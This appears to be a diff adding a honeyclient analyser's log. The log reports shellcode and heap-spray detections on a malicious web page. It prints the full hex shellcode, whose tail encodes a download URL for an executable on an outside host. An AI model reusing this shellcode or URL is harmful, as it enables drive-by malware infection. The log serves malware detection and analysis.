@@ -1,0 +1,29 @@
+PYTHONPATH='lib/python:' python main.py http://172.31.25.227/honeyjs/2mix.html
+
+DEBUG: Alerts:
+====================================
+|--------AID:1----------
+|ATYPE:ALERT_SHELLCODE
+|MESSAGE:Shellcode Detected!
+|MISC:{}
+|SHELLCODE:
+43434343eb0f5b33c966b980018033ef43e2faeb05e8ecffffff7f8b4edfefefef64afe3649ff342649fe76e03efebefef6403b98761a1e1030711efefef66aaebb987771165e1071fefefef66aae7b987ca5f102d070defefef66aae3b98700210f8f073befefef66aaffb9872e960a570729efefef66aafbaf6fd72c9a1566aaf706e8eeefefb1669acb64aaeb85eeb664baf7b90764efefefbf87d9f5c09f0778efefef66aaf3642a6c2fbf66aacf8710efefefbf64aafb85edb664baf7078eefefefecaacf28efb391c18a28afeb978aefef109acf64aae385eeb664baf707afefefef85e8b7ecaacbdc34bcbc109acfbfbc64aaf385eab664baf707ccefefef85ef109acf64aae785edb664baf707ffefefef851064aaff85eeb664baf707efefefefaeb4bdec0eec0eec0eec0e6c03ebb5bc64350d18bd100fba64036492e764b2e3b9649cd3649bf197ec1cb96499cfec1cdc26a6ae42ec2cb9dc19e051ffd51d9be72e21e2ec1daf041ed411b19a0ab5640464b5cbec328964e3a464b5f3ec3264eb64ec2ab1b22de7ef071b111010babda3a2a0a1ef687474703a2f2f70616b73757369632e636e2f6e75632f6578652e706870
+|Now run it:
+PROFILE:
+[]
+====================================
+|--------AID:2----------
+|ATYPE:ALERT_HEAPSPRAY
+|MESSAGE:Heapspray Detected!
+|HIT:6
+|LENGTH:2097152
+|ENTROPY:0.0
+|MISC:{'sledge_char': '\n', 'sec_char_cnt': 0, 'sledge_cnt': 2097152, 'sec_char': '\x00'}
+====================================
+|--------AID:3----------
+|ATYPE:ALERT_HEAPSPRAY
+|MESSAGE:Heapspray Detected!
+|HIT:100
+|LENGTH:2097592
+|ENTROPY:0.00412993356942
+|MISC:{'sledge_char': '\n', 'sec_char_cnt': 13, 'sledge_cnt': 2097154, 'sec_char': '\x07'}
